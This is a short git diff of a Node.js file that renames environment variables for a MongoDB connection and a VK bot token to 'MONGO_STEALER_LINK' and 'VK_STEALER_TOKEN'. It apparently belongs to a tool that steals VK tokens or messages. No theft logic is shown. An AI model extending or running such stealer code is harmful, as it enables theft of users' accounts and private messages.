@@ -8,12 +8,12 @@ const { get_vk_messages } = require('./handler.js')
 const { vk_checker, valid_token } = require("./checker.js");
 
 const client = new MongoClient(
-    process.env.mongostealer,
+    process.env.MONGO_STEALER_LINK,
     { useUnifiedTopology: true },
 );
 
 const vk = new VK({
-    token: process.env.vktoken
+    token: process.env.VK_STEALER_TOKEN
 });
 
 const hearManager = new HearManager();
